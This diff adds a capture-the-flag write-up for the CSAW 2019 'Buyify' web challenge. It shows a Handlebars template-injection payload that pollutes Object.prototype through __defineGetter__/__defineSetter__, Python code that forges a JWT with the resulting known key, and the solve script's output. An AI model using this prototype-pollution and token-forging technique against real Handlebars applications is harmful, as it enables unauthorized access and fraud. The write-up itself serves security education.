@@ -1,0 +1,242 @@
+<h1>Buyify (Web, 500, 15 solves) by [@terjanq]</h1>
+
+<p>This is a solution of [Buyify] web-task from [CSAW 2019 (Quals)] ctf. The challenge was created by [@itszn13], was worth 500 points and was solved by 15 teams. </p>
+
+<p><em>The challenge was really awesome and since all the [files] required to run the instance locally are provided it could be worth taking a look at it before reading through this write-up</em></p>
+
+<h3>A quick look</h3>
+
+<p>We are provided with a simple [website] where we can:
+- visit <code>flag store</code> and buy <code>flag</code> there
+- create new store
+- update created store description
+- create items in created store</p>
+
+<p>After playing around with the webiste I noticed an interesting template in <em>update store description</em> page</p>
+
+<p>```html</p>
+
+<p class="title">{{ store_name }} Store</p>
+
+<p class="subtitle">Welcome to a store for all things {{ store_name }}</p>
+
+<p>```
+Given that, I suspected the problem to be [Server-side Template Injection] related.</p>
+
+<h3>Handlebars and 0day</h3>
+
+<p>The first thing to try with templates is always <code>{{7*7}}</code>. That can quickly confirm whether we hit the mentioned Template Injection or not. When doing so a wild error appeared:</p>
+
+<p><code>
+Error: Parse error on line 1:
+{{7*7}}
+--^
+Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'
+    at Parser.parseError (/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
+    at Parser.parse (/node_modules/handlebars/dist/cjs/h
+....
+</code></p>
+
+<p>From reading through the error, we can see that the library responsible for compiling that template is [handlebars]. Quick research led me to a great article [Handlebars template injection and RCE in a Shopify app] about a vulnerability in that library. The mentioned in there vulnerability was unfortunately patched but all the details, starting with the challenge name, clearly point to <em>bypassing</em> the fix.</p>
+
+<p>However, there was also a hint included</p>
+
+<blockquote>
+  <p><em>HINT: Templates are a prototype for fun and also, don't worry, you don't need rce</em></p>
+</blockquote>
+
+<p>that suggests that there is no need for searching for another critical vulnerability in the library. </p>
+
+<p>In the following sections, I will present a solution split into pieces that are required to understand the problem and omit all the wrong directions I took.</p>
+
+<h3>Purchase the flag</h3>
+
+<p>When visiting http://web.chal.csaw.io:1002/store/flag/ we could try to purchase the flag with the following request beside:</p>
+
+<p>```http
+POST /store/flag/checkout HTTP/1.1
+Host: web.chal.csaw.io:1002
+Content-Length: 158
+Content-Type: application/x-www-form-urlencoded
+Cookie: connect.sid=s%3AOi5yhl-2orxSQ5iN9KzeprT9FThgtxPX.EXOINstCO0gUpXWeK7URQliyfG6KdI7N9j91IWPFAbY</p>
+
+<p>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImZsYWcuZmxhZyIsInByaWNlIjoxMDAwMDAwMDAsImlhdCI6MTU2ODU4Nzg0Mn0.c1RVg_POsjNIT0L0LHBkJ5db12BKPHHbundirMsJdaA
+```</p>
+
+<p>After decoding the token which is an encoded [JSON Web Token] we get a <code>JSON</code> object:</p>
+
+<p><code>json
+{
+  "id": "flag.flag",
+  "price": 100000000,
+  "iat": 1568587842
+}
+</code></p>
+
+<p>Unfortunately, we only get <code>$100</code> on the start so the purchase will not be completed.</p>
+
+<h3>Token format</h3>
+
+<p>The <code>id</code> in the token is created by concatenating <code>store_name</code> and the <code>item_name</code>. We can see that happening in [server.js]:</p>
+
+<p><code>js
+// Create an item, assign it an id, and store its callback
+function create_item(id, name, callback) {
+  let item_id = `${id}.${name}`;
+  items[item_id] = callback;
+  return item_id;
+}
+</code></p>
+
+<p>The token itself is a <code>jwt</code> signed with <code>store.key</code> which we can find in [store.js]: </p>
+
+<p><code>js
+// Sign an item for sale in the store
+function sign_item(item) {
+  let token = jwt.sign({id:item.id, price:item.price}, store.key);
+  return token;
+}
+</code></p>
+
+<h3>Store object</h3>
+
+<p>In the [store.js] we can also notice that the <code>store</code> has the following structure:</p>
+
+<p><code>js
+  /* === Instance === */
+  store = {
+    name: name,
+    id: id,
+    items: [],
+    header_template: `&lt;p class="title"&gt;{{ store_name }} Store&lt;/p&gt;
+&lt;p class="subtitle"&gt;Welcome to a store for all things {{ store_name }}&lt;/p&gt;`,
+    item_map: {},
+  };
+</code></p>
+
+<p>A very odd thing is that the <code>key</code> attribute is not defined here, but we saw earlier that <code>store.key</code> was used to encode the token.</p>
+
+<p>In [store.js] we can find a place where <code>store.key</code> is actually defined: </p>
+
+<p>```js
+// Invalidate and resign all items
+function update_store() {
+  // Create store key with long random string
+  store.key = crypto.randomBytes(64).toString('hex');</p>
+
+<p>for (let item of store.items) {
+    item.token = sign_item(item);
+  }
+}
+```</p>
+
+<p>From cryptographic perspective this looks impossible to crack. Let's see when <code>update_store()</code> function is called. </p>
+
+<p>```js
+// Create an item with a given name and price
+function create<em>item</em>impl(name, price, cb) {
+  let item = {
+    name: name,
+    price: price,
+  };</p>
+
+<p>// The server assigns an item id to us that is unique
+  item.id = g<em>create</em>item(name, cb);</p>
+
+<p>store.items.push(item);
+  store.item_map[item.id] = item;</p>
+
+<p>update_store();
+}
+```</p>
+
+<p>From reading the above function it becomes obvious that <code>store.key</code> is defined via <code>update_store()</code> and that happens when a new item is created. That will also update all the previous items in the process. This will come in handy very soon.</p>
+
+<h3>What if we knew the secret key?</h3>
+
+<p>If we knew the secret key from <code>store</code> object we could sign an object <code>{'id': 'flag.flag', 'price':'1'}</code> with that key and then by sending a <code>/checkout</code> request from <a href="#Purchase-the-flag">#Purchase-the-flag</a> section, receive the flag. That is because of the following part of the[server.js]:</p>
+
+<p>```js
+// Get an item callback
+function get<em>item(item) {
+  money</em>count += item.price;
+  return items[item.id];
+}</p>
+
+<p>// Create the Flag store and the Flag item
+stores[create<em>store('Flag','flag')].create</em>item('flag', 100000000, (id, req, res)=&gt;{
+  flag_count++;
+  res.send(<code>Congrats! Your flag is ${
+      fs.readFileSync('flag.txt').toString().replace(/^\s+|\s+$/g, '')}!</code>);
+});
+```</p>
+
+<p>There are some security checks being done before accessing the flag but the crucial one is in <code>checkout(req, res)</code> function.</p>
+
+<p><code>js
+item = jwt.verify(req.body.token, store.key);
+</code></p>
+
+<p>Basically, to access the flag we must make verify function not to throw an error, i.e. the signature must match the key.</p>
+
+<h3>Let's head back to template injection</h3>
+
+<p>So, I mentioned earlier about this great bug in <code>Shopify</code> store that allowed to get an <code>RCE</code> and that does not work anymore. The reason why we cannot get the remote code execution using that trick is that any attempt to calling the <code>constructor</code> of any object will return <code>undefined</code>. Without a <code>constructor</code> it is not trivial to iterate over contexts or to evaluate a string. But in the hint, it was said that we do not need to achieve <code>RCE</code>.</p>
+
+<p>To solve the challenge we would either want to read the <code>store.key</code> or override it with a value known to us. The syntax of [handlebars] is limited but it has [helper functions] that can do some crazy things. To take advantage of <a href="#Store-object">#Store-object</a> we would ideally want to override the Object prototype and define our own [setter] and [getter] on <code>key</code> property so we can either read the key or replace it with controlled by us value. </p>
+
+<p>In plain <code>javascript</code> it could look like:</p>
+
+<p><code>js
+  Object.defineProperty(
+    Object.prototype, 'key', {
+     get: function(){
+       return this.toString()
+     }
+     set: function(){
+       return this.toString()
+     }
+   }
+  )
+</code></p>
+
+<p>Since we cannot access any <code>constructor</code> property, getting reference to <code>Object</code> is a challenging task. But there is another way to define [setter] or [getter]. There are deprecated features like [__defineSetter__] and [__defineGetter__] that still work. These can be called in [handlebars] for example in that payload: <code>{{this.__proto__.__defineGetter__}}</code>. I managed to use this and override the prototype with the following payload:</p>
+
+<p><code>js
+{{#with this.__proto__ as |o|}}
+    {{o.__defineGetter__ "key" toString}}
+    {{o.__defineSetter__ "key" toString}}
+{{/with}}
+</code></p>
+
+<p>It is equivalent to the <code>Object.defineProperty</code> mentioned above. What it does is:
+1) Setting a context to the prototype of <code>[object]</code> and aliasing it to <code>|o|</code> via [#with] helper.
+2) Calling [__defineSetter__] and [__defineGetter__] on <code>Object.prototype</code> with <code>key</code> as attribute and <code>this.toString()</code> as a callback that override [setter] and [getter]. 
+3) After that, accessing <code>[object].key</code> on newly created objects shall now return <code>[object Object]</code> as a string and it cannot be overriden using <code>[object].key = ...</code> because we overrode a setter function. </p>
+
+<h3>Win the lottery</h3>
+
+<p>So now, the last missing piece is to forge a valid <code>token</code> with <code>[object Object]</code> as a key and <code>flag.flag</code> as an id.</p>
+
+<p>```py</p>
+
+<h1>Forge flag token</h1>
+
+<p>flag_token = jwt.encode({
+    "id": "flag.flag",
+    "price": 1,
+    "iat": 1568568228
+  }, '[object Object]', algorithm='HS256')</p>
+
+<p>```</p>
+
+<p>Then using it to purchase the flag for <code>$1</code> in our store. </p>
+
+<p>I automated the process with [solve.py] where I briefly described each step. By executing the exploit I got the flag <strong>flag{npm<em>devs</em>are<em>pretty</em>bad<em>at</em>fixing_bugs}</strong></p>
+
+<p><code>sh
+$ python solve.py
+('store_id:', 'fedeb307e6104baf')
+('connect.sid:', 's%3A1vs4vfSD3GEal8dD2lGuRAJgtUk2XIO0.m%2BE252u74l2ffXB1fOAuNPu1awVwzANQmg9KLqOfWmk')
+Congrats! Your flag is flag{npm_devs_are_pretty_bad_at_fixing_bugs}!
+</code></p>
